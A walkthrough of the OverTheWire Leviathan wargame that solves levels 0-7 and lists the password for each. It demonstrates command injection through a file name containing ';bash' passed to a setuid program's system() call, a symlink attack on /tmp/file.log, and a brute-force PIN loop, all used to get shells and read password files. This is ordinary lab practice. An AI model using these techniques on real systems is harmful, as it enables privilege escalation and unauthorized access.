# Leviathan

For every level `ssh leviathan[level]@leviathan.labs.overthewire.org -p 2223`

## Leviathan 0

u: leviathan0
p: leviathan0

ls -lash
cd .backup
cat bookmarks.html|grep pass

Password for leviathan1: rioGegei8m

Level 1:
u: leviathan1
p: rioGegei8m

ls -lash

There is a setuid binary called `check`. Running it prompts for a password.

hexdump -C check

We see four plaintext words 'sex','secret','god','love'
We try each of those as the password and 'sex' successfully drops us into a bash shell.

cat /etc/leviathan_pass/leviathan2

Password for leviathan2: ougahZi8Ta

Level 2:
u: leviathan2
p: ougahZi8Ta

There is a setuid binary called 'printfile'. Running it shows that it prints any file as leviathan3.

./printfile /etc/leviathan_pass/leviathan3

Crap... apparently we "can't have that file...". So we can assume there is some sort of filtering going on. Lets take a look at what the code is actually doing.

ltrace ./printfile .bashrc

__libc_start_main(0x804852b, 2, 0xffffd774, 0x8048610 <unfinished ...> 
access(".bashrc", 4)                                          = 0
snprintf("/bin/cat .bashrc", 511, "/bin/cat %s", ".bashrc")   = 16
geteuid()                                                     = 12002
geteuid()                                                     = 12002
setreuid(12002, 12002)                                        = 0
system("/bin/cat .bashrc"

So we see it just takes our argument and supplies it to `/bin/cat`.
It doesnt do any sanitation on the filename so as long as we have access to it. We can have a file named whatever we want. In this case, we want a filename that executes another command upon evaluation by the above code.

mkdir /tmp/jdh0
touch "/tmp/jdh0/fake;bash"

Now if we run this file through the binary, it will make the `system()` call "/bin/cat fake;bash" which should give us a shell as leviathan3.

./printfile "/tmp/jdh0/fake;bash"
whoami

And voila! We are now in a bash shell as leviathan3.

cat /etc/leviathan_pass/leviathan3

The password for leviathan3 is Ahdiemoo1j

Level 3:
u: leviathan3
p: Ahdiemoo1j

ls -lash

We see another setuid binary called "level3". When we run it, we get a password prompt. Lets see what its doing.

ltrace ./level3

__libc_start_main(0x8048618, 1, 0xffffd784, 0x80486d0 <unfinished ...>
strcmp("h0no33", "kakaka")                                    = -1
printf("Enter the password> ")                                = 20
fgets(Enter the password> abc                                      
"abc\n", 256, 0xf7fc55a0)                               = 0xffffd590
strcmp("abc\n", "snlprintf\n")                                = -1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                                    = 19
+++ exited (status 0) +++

It does a random string comparison that will always return false...useless.
Then it prompts for the password.
Then it compares what we provide with the string "snlprintf\n"
So if I am reading this correctly, we just have to type in "snlprintf" as the password?
And yep, we got a shell for leviathan4.

cat /etc/leviathan_pass/leviathan4

The password for leviathan4 is vuH0coox6m

Level 4:
u: leviathan4
p: vuH0coox6m

ls -lash

We see a hidden directory ".trash"

ls -lash .trash

We see a setuid binary called "bin"

.trash/bin

This just prints out a bunch of binary. I bet if we convert it to ascii, it will be the password. Just copy that binary into an online binary to ascii converter and voila!

The password for leviathan5 is Tith4cokei

Level 5:
u: leviathan5
p: Tith4cokei

ls -lash

There is yet another setuid binary called "leviathan5". Running it produces the output "Cannot find /tmp/file.log". So it is looking for that file and presumably printing it out. What if we just tried to symbolically link a file called "/tmp/file.log" to "/etc/leviathan_pass/leviathan6"

ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log

No errors. So it might have worked!

./leviathan5

And there it is!

The password for leviathan6 is UgaoFee4li

Level 6:
u: leviathan6
p: UgaoFee4li

ls -lash

There is, you guessed it, another setuid binary called "leviathan6". When we run it, we see that it is looking for a 4-digit code. Possibly a pin number to give us the password. There are 10,000 possibilities so lets just brute force it yea?

for i in {0000..9999}; do ./leviathan6 $i;done

We wait for this to run and sure enough we get a shell.

cat /etc/leviathan_pass/leviathan7

The password for leviathan7 is ahy7MaeBo9

Level 7:
u: leviathan7
p: ahy7MaeBo9

ls -lash

And we see CONGRATULATIONS because this we completed Leviathan! Simple and fun!
